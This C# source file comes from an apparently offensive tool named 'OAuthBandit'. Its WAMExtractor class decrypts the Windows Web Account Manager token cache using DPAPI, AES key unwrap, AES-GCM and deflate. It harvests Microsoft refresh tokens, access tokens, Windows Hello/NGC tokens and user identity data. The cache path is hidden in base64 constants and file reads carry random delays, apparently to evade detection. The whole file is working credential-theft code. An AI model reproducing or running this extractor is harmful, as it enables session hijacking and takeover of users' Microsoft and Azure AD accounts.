using System.IO.Compression;
using System.Text;
using System.Text.RegularExpressions;
using OAuthBandit.Core;
using OAuthBandit.Crypto;
using OAuthBandit.Utils;

namespace OAuthBandit.Extractors;

// WAM (Web Account Manager) cache extractor
// files are CMS enveloped + dpapi + aes-gcm + deflate compressed
// absolute nightmare to reverse engineer lol
public class WAMExtractor : BaseExtractor
{
    private static readonly Random _rng = new();
    private readonly string _cachePath;

    public WAMExtractor()
    {
        var publisher = CryptoUtils.DecodeBase64(Constants.EncodedPublisher);
        var publisherId = EncodingUtils.GetPublisherId(publisher);

        _cachePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            CryptoUtils.DecodeBase64(Constants.EncodedPackages),
            $"Microsoft.AAD.{CryptoUtils.DecodeBase64(Constants.EncodedBrokerPlugin)}_{publisherId}",
            CryptoUtils.DecodeBase64(Constants.EncodedLocalState)
        );
    }

    public override List<Token> Extract()
    {
        var tokens = new List<Token>();
        var processed = new HashSet<string>();

        if (!Directory.Exists(_cachePath))
        {
            Console.WriteLine("    ! wam cache missing");
            return tokens;
        }

        var allFiles = Directory.GetFiles(_cachePath, "*", SearchOption.AllDirectories);
        Console.WriteLine($"    > {allFiles.Length} wam files");

        foreach (var filePath in allFiles)
        {
            var fileName = Path.GetFileName(filePath).ToLowerInvariant();
            if (!fileName.EndsWith(".def") && !fileName.StartsWith("p_") && !fileName.StartsWith("a_"))
                continue;

            Thread.Sleep(_rng.Next(20, 80));

            try
            {
                var fileTokens = ProcessFile(filePath, processed);
                tokens.AddRange(fileTokens);
            }
            catch { }
        }

        return tokens;
    }

    private List<Token> ProcessFile(string filePath, HashSet<string> processed)
    {
        var tokens = new List<Token>();

        var decryptedData = DecryptWamFile(filePath);
        if (decryptedData == null) return tokens;

        var rawText = ExtractRawData(decryptedData);
        if (rawText == null) return tokens;

        var fileName = Path.GetFileName(filePath).ToLowerInvariant();
        bool isPrtBound = fileName.StartsWith("p_");

        // extract refresh tokens first
        foreach (Match match in Constants.RefreshTokenPattern.Matches(rawText))
        {
            var rt = match.Groups[1].Value;
            if (rt.Length <= 200) continue;

            var dedupKey = rt[..200];
            if (!processed.Add(dedupKey)) continue;

            var token = CreateRefreshToken(rt, filePath, rawText, isPrtBound);
            if (token != null) tokens.Add(token);
        }

        // ngc tokens (windows hello / next gen credentials)
        foreach (Match match in Constants.NgcTokenPattern.Matches(rawText))
        {
            var ngc = match.Groups[1].Value;
            if (ngc.Length <= 50) continue;

            var dedupKey = $"NGC:{ngc}";
            if (!processed.Add(dedupKey)) continue;

            var ngcFileName = Path.GetFileName(filePath).ToLowerInvariant();
            var ngcSourceType = ngcFileName.StartsWith("p_") ? "PRT_FILE" :
                                ngcFileName.StartsWith("a_") ? "AUTHORITY_FILE" : "UNKNOWN";
            tokens.Add(new Token
            {
                TokenType = "ngc_token",
                TokenValue = ngc,
                Application = "Windows Hello / NGC",
                SourceFile = Path.GetFileName(filePath),
                CachePath = filePath,
                IsPrtBound = isPrtBound,
                SourceType = ngcSourceType,
                ExtractedAt = ExtractedAt,
                IsExpired = false
            });
        }

        // access tokens (JWT)
        foreach (Match match in Constants.JwtPattern.Matches(rawText))
        {
            var jwt = match.Groups[1].Value;
            var dedupKey = jwt.Length > 200 ? jwt[..200] : jwt;
            if (!processed.Add(dedupKey)) continue;

            var token = CreateAccessToken(jwt, filePath, isPrtBound);
            if (token != null) tokens.Add(token);
        }

        // enrich refresh tokens with metadata from access tokens in same file
        var fileAts = tokens.Where(t => t.TokenType == "access_token" && t.Upn != null).ToList();
        foreach (var rt in tokens.Where(t => t.TokenType == "refresh_token"))
        {
            var donor = fileAts.FirstOrDefault();
            if (donor == null) continue;
            if (rt.Upn == null) rt.Upn = donor.Upn;
            if (rt.DisplayName == null) rt.DisplayName = donor.DisplayName;
            if (rt.UserOid == null) rt.UserOid = donor.UserOid;
            if (rt.TenantId == null) rt.TenantId = donor.TenantId;
        }

        return tokens;
    }

    private Token? CreateRefreshToken(string rt, string filePath, string rawText, bool isPrtBound)
    {
        var (clientId, tenantId) = ExtractRefreshTokenMetadata(rt);

        string? upn = null;
        var emailMatch = Constants.EmailPattern.Match(rawText);
        if (emailMatch.Success) upn = emailMatch.Groups[1].Value;

        if (!IsMicrosoftToken(clientId, null, upn, rt)) return null;

        var fileName = Path.GetFileName(filePath).ToLowerInvariant();
        var sourceType = fileName.StartsWith("p_") ? "PRT_FILE" :
                         fileName.StartsWith("a_") ? "AUTHORITY_FILE" : "UNKNOWN";

        var application = IdentifyApplication(clientId, null);
        var token = new Token
        {
            TokenType = "refresh_token",
            TokenValue = rt,
            Application = application,
            ClientId = clientId,
            Upn = upn,
            TenantId = tenantId,
            SourceFile = Path.GetFileName(filePath),
            CachePath = filePath,
            IsPrtBound = isPrtBound,
            SourceType = sourceType,
            ExtractedAt = ExtractedAt,
            IsExpired = false
        };
        token.CheckOfficeMaster();
        return token;
    }

    private Token? CreateAccessToken(string jwt, string filePath, bool isPrtBound)
    {
        var payload = ParseJwtPayload(jwt);
        if (payload == null) return null;

        var clientId = GetClientIdWithAudFallback(payload);
        var upn = GetJsonString(payload, "upn", "unique_name", "email", "preferred_username");
        var tenantId = GetJsonString(payload, "tid", "tenant_id");
        var scope = GetJsonString(payload, "scp", "scope");

        string? expiresAt = null;
        bool isExpired = false;
        var exp = GetJsonLong(payload, "exp");
        if (exp.HasValue)
        {
            var expDt = DateTimeOffset.FromUnixTimeSeconds(exp.Value).LocalDateTime;
            expiresAt = expDt.ToString("yyyy-MM-dd HH:mm:ss");
            isExpired = expDt < DateTime.Now;
        }
        if (isExpired) return null;

        if (!IsMicrosoftToken(clientId, scope, upn, jwt)) return null;

        var fileName = Path.GetFileName(filePath).ToLowerInvariant();
        var sourceType = fileName.StartsWith("p_") ? "PRT_FILE" :
                         fileName.StartsWith("a_") ? "AUTHORITY_FILE" : "UNKNOWN";

        var application = IdentifyApplication(clientId, scope);
        var token = new Token
        {
            TokenType = "access_token",
            TokenValue = jwt,
            Application = application,
            ClientId = clientId,
            Upn = upn,
            TenantId = tenantId,
            Scope = scope,
            SourceFile = Path.GetFileName(filePath),
            CachePath = filePath,
            IsPrtBound = isPrtBound,
            SourceType = sourceType,
            ExtractedAt = ExtractedAt,
            ExpiresAt = expiresAt,
            IsExpired = isExpired,
            DisplayName = GetJsonString(payload, "name"),
            UserOid = GetJsonString(payload, "oid"),
            Audience = GetJsonString(payload, "aud")
        };
        token.CheckOfficeMaster();
        return token;
    }

    private static byte[]? DecryptWamFile(string filePath)
    {
        try
        {
            var fileBytes = File.ReadAllBytes(filePath);

            // skip BOM if present
            int offset = 0;
            if (fileBytes.Length >= 3 && fileBytes[0] == 0xEF && fileBytes[1] == 0xBB && fileBytes[2] == 0xBF)
                offset = 3;

            // check for 3-1 signature header
            if (fileBytes.Length < offset + 3) return null;
            if (fileBytes[offset] != (byte)'3' || fileBytes[offset + 1] != (byte)'-' || fileBytes[offset + 2] != (byte)'1')
                return null;

            // rest is base64
            var b64str = Encoding.UTF8.GetString(fileBytes, offset + 3, fileBytes.Length - offset - 3);
            var blob = Convert.FromBase64String(b64str);

            // parse the CMS envelope
            var cmsData = CryptoUtils.ParseCmsEnvelopedData(blob);
            if (cmsData == null) return null;

            // decrypt KEK via dpapi
            var kek = CryptoUtils.DpapiDecrypt(cmsData.Kek);
            if (kek == null) return null;

            // unwrap the content encryption key
            var cek = CryptoUtils.AesKeyUnwrap(kek, cmsData.EncryptedCek);
            if (cek == null) return null;

            // decrypt actual content w/ aes-gcm
            var encContent = cmsData.EncryptedContent;
            if (encContent.Length < 16) return null;
            var ciphertext = encContent[..^16];
            var tag = encContent[^16..];

            var decrypted = CryptoUtils.AesGcmDecrypt(cek, cmsData.Iv, ciphertext, tag);
            if (decrypted == null) return null;

            // decompress - skip the wierd 6 byte header before deflate
            if (decrypted.Length < 7) return decrypted;
            try
            {
                using var ms = new MemoryStream(decrypted, 6, decrypted.Length - 6);
                using var deflate = new DeflateStream(ms, CompressionMode.Decompress);
                using var output = new MemoryStream();
                deflate.CopyTo(output);
                return output.ToArray();
            }
            catch
            {
                // deflate failed, return raw data as fallback
                return decrypted;
            }
        }
        catch { return null; }
    }

    // parse raw text from decrypted wam blob
    // handles json header (0x13) and binary length-prefixed formats
    private static string? ExtractRawData(byte[] data)
    {
        if (data.Length == 0) return null;

        // json header format - skip 8 byte header
        if (data[0] == 0x13 && data.Length > 8)
            return Encoding.UTF8.GetString(data, 8, data.Length - 8);

        var raw = Encoding.UTF8.GetString(data);

        // if too many control chars its probably binary with length-prefixed strings
        int controlCount = raw.Count(c => char.IsControl(c) && c != '\n' && c != '\r' && c != '\t');
        if (controlCount > raw.Length / 4)
        {
            var strings = ExtractLengthPrefixedStrings(data);
            if (strings.Count > 0)
                return string.Join("\n", strings);
        }

        return raw;
    }

    // some WAM blobs store data as length-prefixed strings instead of json
    // walk the buffer looking for uint32 length + utf8 string pairs
    private static List<string> ExtractLengthPrefixedStrings(byte[] buffer)
    {
        var result = new List<string>();
        int offset = 0;

        while (offset <= buffer.Length - 4)
        {
            uint length = BitConverter.ToUInt32(buffer, offset);
            int strStart = offset + 4;
            int remaining = buffer.Length - strStart;

            if (length > 0 && length <= remaining && length < 10000)
            {
                try
                {
                    var s = Encoding.UTF8.GetString(buffer, strStart, (int)length);
                    if (!s.Contains('\0') && s.All(c => !char.IsControl(c) || c == '\r' || c == '\n' || c == '\t'))
                        result.Add(s);
                }
                catch { }
            }
            offset++;
        }
        return result;
    }
}
